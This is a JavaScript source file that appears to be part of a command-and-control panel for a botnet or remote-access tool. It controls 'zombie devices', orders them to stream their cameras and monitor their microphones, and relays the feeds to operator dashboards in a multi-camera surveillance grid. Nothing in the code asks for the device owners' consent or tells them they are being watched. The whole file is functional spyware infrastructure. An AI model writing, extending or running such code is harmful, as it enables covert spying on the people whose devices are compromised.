/**
 * Live Streaming Manager for Ghost Resurrection System Phase 3
 * 
 * Manages multi-camera streaming, audio monitoring, and real-time surveillance
 * feeds from zombie devices with Hollywood-level production quality.
 */

class LiveStreamingManager {
    constructor(ghostManager, io) {
        this.ghostManager = ghostManager;
        this.io = io;
        this.activeStreams = new Map(); // deviceId -> stream info
        this.streamQualities = ['low', 'medium', 'high', 'ultra'];
        this.maxConcurrentStreams = 16; // Matrix-style grid support
        this.streamingClients = new Map(); // clientId -> client info
        
        this.initializeStreamingService();
        console.log('📡 Live Streaming Manager v3.0 initialized');
        console.log('🎥 Multi-camera surveillance grid ready');
        console.log('🔊 Real-time audio monitoring enabled');
    }

    /**
     * Initialize streaming service with Socket.IO handlers
     */
    initializeStreamingService() {
        this.io.on('connection', (socket) => {
            // Handle streaming client registration
            socket.on('streaming_client_register', (clientInfo) => {
                this.registerStreamingClient(socket.id, clientInfo);
            });

            // Start camera stream from device
            socket.on('start_camera_stream', (data) => {
                this.handleStartCameraStream(socket.id, data);
            });

            // Stop camera stream
            socket.on('stop_camera_stream', (data) => {
                this.handleStopCameraStream(socket.id, data);
            });

            // Handle stream data from device
            socket.on('stream_data', (data) => {
                this.handleStreamData(socket.id, data);
            });

            // Request stream quality change
            socket.on('change_stream_quality', (data) => {
                this.handleStreamQualityChange(socket.id, data);
            });

            // Start audio monitoring
            socket.on('start_audio_monitor', (data) => {
                this.handleStartAudioMonitor(socket.id, data);
            });

            // Stop audio monitoring
            socket.on('stop_audio_monitor', (data) => {
                this.handleStopAudioMonitor(socket.id, data);
            });

            // Handle client disconnect
            socket.on('disconnect', () => {
                this.handleClientDisconnect(socket.id);
            });
        });
    }

    /**
     * Register streaming client (dashboard user)
     */
    registerStreamingClient(socketId, clientInfo) {
        const client = {
            id: socketId,
            name: clientInfo.name || 'Control Room Operator',
            registeredAt: new Date(),
            subscribedStreams: new Set(),
            streamingCapabilities: clientInfo.capabilities || ['video', 'audio']
        };

        this.streamingClients.set(socketId, client);
        console.log(`🎬 Streaming client registered: ${client.name}`);

        // Send current active streams to new client
        this.sendActiveStreamsToClient(socketId);
    }

    /**
     * Start camera stream from zombie device
     */
    async handleStartCameraStream(socketId, data) {
        try {
            const { deviceId, quality = 'medium', camera = 'back' } = data;
            
            // Verify device exists and is active
            const device = this.ghostManager.getZombieByDeviceId(deviceId);
            if (!device) {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Device not found',
                    deviceId
                });
                return;
            }

            const session = this.ghostManager.activeSessions.get(deviceId);
            if (!session) {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Device not active',
                    deviceId
                });
                return;
            }

            // Check streaming limits
            if (this.activeStreams.size >= this.maxConcurrentStreams) {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Maximum concurrent streams reached',
                    limit: this.maxConcurrentStreams
                });
                return;
            }

            // Create stream configuration
            const streamConfig = {
                deviceId,
                type: 'camera',
                quality,
                camera,
                startTime: new Date(),
                clientId: socketId,
                frameRate: this.getFrameRateForQuality(quality),
                resolution: this.getResolutionForQuality(quality),
                bitrate: this.getBitrateForQuality(quality)
            };

            // Send stream start command to device
            const commandResult = await this.ghostManager.executeAdvancedCommand(deviceId, {
                command: 'start_camera_stream',
                priority: 'high',
                timeout: 30,
                parameters: {
                    quality: quality,
                    camera: camera,
                    frameRate: streamConfig.frameRate,
                    resolution: streamConfig.resolution,
                    clientId: socketId
                }
            });

            if (commandResult.success) {
                // Register active stream
                this.activeStreams.set(deviceId, streamConfig);
                
                // Update Ghost Manager streaming sessions
                this.ghostManager.streamingSessions.set(deviceId, {
                    deviceId,
                    type: 'camera',
                    quality,
                    startTime: new Date(),
                    clientId: socketId
                });

                console.log(`🎥 Camera stream started: ${device.name} -> Client ${socketId}`);
                
                // Notify client of successful stream start
                this.io.to(socketId).emit('stream_started', {
                    deviceId,
                    type: 'camera',
                    quality,
                    camera,
                    resolution: streamConfig.resolution,
                    frameRate: streamConfig.frameRate
                });

                // Notify all streaming clients about new stream
                this.broadcastToStreamingClients('new_stream_available', {
                    deviceId,
                    deviceName: device.name,
                    type: 'camera',
                    quality,
                    camera
                });
            } else {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Failed to start stream on device',
                    deviceId,
                    details: commandResult.error
                });
            }

        } catch (error) {
            console.error('💥 Error starting camera stream:', error);
            this.io.to(socketId).emit('stream_error', {
                error: error.message,
                deviceId: data.deviceId
            });
        }
    }

    /**
     * Handle stream data from device and forward to clients
     */
    handleStreamData(socketId, data) {
        const { deviceId, streamType, frameData, audioData, timestamp } = data;
        
        // Verify this is an active stream
        const stream = this.activeStreams.get(deviceId);
        if (!stream) {
            return; // Ignore data from inactive streams
        }

        // Update stream statistics
        stream.lastFrameTime = new Date();
        stream.framesReceived = (stream.framesReceived || 0) + 1;

        // Prepare stream data for clients
        const streamData = {
            deviceId,
            deviceName: this.ghostManager.getZombieByDeviceId(deviceId)?.name,
            streamType,
            frameData,
            audioData,
            timestamp,
            quality: stream.quality,
            frameNumber: stream.framesReceived
        };

        // Forward to all subscribed streaming clients
        this.broadcastToStreamingClients('stream_frame', streamData);

        // Update performance metrics
        this.ghostManager.performanceMetrics.dataTransferred += 
            (frameData ? frameData.length : 0) + (audioData ? audioData.length : 0);
    }

    /**
     * Stop camera stream
     */
    async handleStopCameraStream(socketId, data) {
        try {
            const { deviceId } = data;
            
            const stream = this.activeStreams.get(deviceId);
            if (!stream) {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Stream not found',
                    deviceId
                });
                return;
            }

            // Send stop command to device
            await this.ghostManager.executeAdvancedCommand(deviceId, {
                command: 'stop_camera_stream',
                priority: 'high',
                timeout: 15
            });

            // Remove from active streams
            this.activeStreams.delete(deviceId);
            this.ghostManager.streamingSessions.delete(deviceId);

            console.log(`🎥 Camera stream stopped: ${deviceId}`);

            // Notify clients
            this.io.to(socketId).emit('stream_stopped', { deviceId });
            this.broadcastToStreamingClients('stream_ended', { deviceId });

        } catch (error) {
            console.error('💥 Error stopping camera stream:', error);
            this.io.to(socketId).emit('stream_error', {
                error: error.message,
                deviceId: data.deviceId
            });
        }
    }

    /**
     * Handle stream quality change
     */
    async handleStreamQualityChange(socketId, data) {
        try {
            const { deviceId, newQuality } = data;
            
            if (!this.streamQualities.includes(newQuality)) {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Invalid quality setting',
                    supportedQualities: this.streamQualities
                });
                return;
            }

            const stream = this.activeStreams.get(deviceId);
            if (!stream) {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Stream not found',
                    deviceId
                });
                return;
            }

            // Update stream configuration
            stream.quality = newQuality;
            stream.frameRate = this.getFrameRateForQuality(newQuality);
            stream.resolution = this.getResolutionForQuality(newQuality);
            stream.bitrate = this.getBitrateForQuality(newQuality);

            // Send quality change command to device
            await this.ghostManager.executeAdvancedCommand(deviceId, {
                command: 'change_stream_quality',
                priority: 'high',
                timeout: 15,
                parameters: {
                    quality: newQuality,
                    frameRate: stream.frameRate,
                    resolution: stream.resolution,
                    bitrate: stream.bitrate
                }
            });

            console.log(`🎥 Stream quality changed: ${deviceId} -> ${newQuality}`);

            this.io.to(socketId).emit('stream_quality_changed', {
                deviceId,
                quality: newQuality,
                frameRate: stream.frameRate,
                resolution: stream.resolution
            });

        } catch (error) {
            console.error('💥 Error changing stream quality:', error);
            this.io.to(socketId).emit('stream_error', {
                error: error.message,
                deviceId: data.deviceId
            });
        }
    }

    /**
     * Start audio monitoring
     */
    async handleStartAudioMonitor(socketId, data) {
        try {
            const { deviceId, sensitivity = 'medium' } = data;
            
            // Send audio monitoring command to device
            const result = await this.ghostManager.executeAdvancedCommand(deviceId, {
                command: 'start_audio_monitor',
                priority: 'high',
                timeout: 20,
                parameters: {
                    sensitivity,
                    clientId: socketId
                }
            });

            if (result.success) {
                console.log(`🔊 Audio monitoring started: ${deviceId}`);
                this.io.to(socketId).emit('audio_monitor_started', { deviceId, sensitivity });
            } else {
                this.io.to(socketId).emit('stream_error', {
                    error: 'Failed to start audio monitoring',
                    deviceId
                });
            }

        } catch (error) {
            console.error('💥 Error starting audio monitor:', error);
            this.io.to(socketId).emit('stream_error', {
                error: error.message,
                deviceId: data.deviceId
            });
        }
    }

    /**
     * Get frame rate based on quality setting
     */
    getFrameRateForQuality(quality) {
        const rates = {
            low: 15,
            medium: 24,
            high: 30,
            ultra: 60
        };
        return rates[quality] || 24;
    }

    /**
     * Get resolution based on quality setting
     */
    getResolutionForQuality(quality) {
        const resolutions = {
            low: '480x320',
            medium: '720x480',
            high: '1280x720',
            ultra: '1920x1080'
        };
        return resolutions[quality] || '720x480';
    }

    /**
     * Get bitrate based on quality setting
     */
    getBitrateForQuality(quality) {
        const bitrates = {
            low: 256,   // kbps
            medium: 512,
            high: 1024,
            ultra: 2048
        };
        return bitrates[quality] || 512;
    }

    /**
     * Send active streams to specific client
     */
    sendActiveStreamsToClient(clientId) {
        const streams = Array.from(this.activeStreams.values()).map(stream => ({
            deviceId: stream.deviceId,
            deviceName: this.ghostManager.getZombieByDeviceId(stream.deviceId)?.name,
            type: stream.type,
            quality: stream.quality,
            camera: stream.camera,
            startTime: stream.startTime,
            resolution: stream.resolution,
            frameRate: stream.frameRate
        }));

        this.io.to(clientId).emit('active_streams', { streams });
    }

    /**
     * Broadcast message to all streaming clients
     */
    broadcastToStreamingClients(event, data) {
        this.streamingClients.forEach((client, clientId) => {
            this.io.to(clientId).emit(event, data);
        });
    }

    /**
     * Handle client disconnect cleanup
     */
    handleClientDisconnect(socketId) {
        // Remove client from streaming clients
        const client = this.streamingClients.get(socketId);
        if (client) {
            this.streamingClients.delete(socketId);
            console.log(`🎬 Streaming client disconnected: ${client.name}`);
        }

        // Stop any streams initiated by this client
        for (const [deviceId, stream] of this.activeStreams.entries()) {
            if (stream.clientId === socketId) {
                this.stopStreamForDevice(deviceId);
            }
        }
    }

    /**
     * Stop stream for specific device
     */
    async stopStreamForDevice(deviceId) {
        try {
            await this.ghostManager.executeAdvancedCommand(deviceId, {
                command: 'stop_all_streams',
                priority: 'high',
                timeout: 15
            });

            this.activeStreams.delete(deviceId);
            this.ghostManager.streamingSessions.delete(deviceId);
            
            console.log(`🔌 Stream stopped for device: ${deviceId}`);
        } catch (error) {
            console.error(`💥 Error stopping stream for device ${deviceId}:`, error);
        }
    }

    /**
     * Get streaming statistics
     */
    getStreamingStats() {
        const stats = {
            totalActiveStreams: this.activeStreams.size,
            maxConcurrentStreams: this.maxConcurrentStreams,
            connectedClients: this.streamingClients.size,
            streamsByQuality: {},
            streamsByType: {},
            totalFramesReceived: 0,
            averageFrameRate: 0
        };

        // Calculate detailed statistics
        this.activeStreams.forEach(stream => {
            // Count by quality
            stats.streamsByQuality[stream.quality] = 
                (stats.streamsByQuality[stream.quality] || 0) + 1;

            // Count by type
            stats.streamsByType[stream.type] = 
                (stats.streamsByType[stream.type] || 0) + 1;

            // Total frames
            stats.totalFramesReceived += stream.framesReceived || 0;
        });

        return stats;
    }

    /**
     * Create multi-camera grid view
     */
    async createGridView(clientId, deviceIds, gridSize = '2x2') {
        try {
            const validGridSizes = ['1x1', '2x2', '3x3', '4x4'];
            if (!validGridSizes.includes(gridSize)) {
                throw new Error(`Invalid grid size. Supported: ${validGridSizes.join(', ')}`);
            }

            const maxDevices = parseInt(gridSize.split('x')[0]) * parseInt(gridSize.split('x')[1]);
            const selectedDevices = deviceIds.slice(0, maxDevices);

            // Start streams for all selected devices
            const streamPromises = selectedDevices.map(deviceId => 
                this.handleStartCameraStream(clientId, {
                    deviceId,
                    quality: 'medium',
                    camera: 'back'
                })
            );

            await Promise.all(streamPromises);

            // Send grid configuration to client
            this.io.to(clientId).emit('grid_view_created', {
                gridSize,
                devices: selectedDevices,
                layout: this.calculateGridLayout(gridSize)
            });

            console.log(`📺 Multi-camera grid created: ${gridSize} for client ${clientId}`);

        } catch (error) {
            console.error('💥 Error creating grid view:', error);
            this.io.to(clientId).emit('grid_error', {
                error: error.message
            });
        }
    }

    /**
     * Calculate grid layout positions
     */
    calculateGridLayout(gridSize) {
        const [rows, cols] = gridSize.split('x').map(Number);
        const layout = [];

        for (let row = 0; row < rows; row++) {
            for (let col = 0; col < cols; col++) {
                layout.push({
                    position: row * cols + col,
                    row,
                    col,
                    width: `${100/cols}%`,
                    height: `${100/rows}%`,
                    left: `${(100/cols) * col}%`,
                    top: `${(100/rows) * row}%`
                });
            }
        }

        return layout;
    }
}

module.exports = LiveStreamingManager;
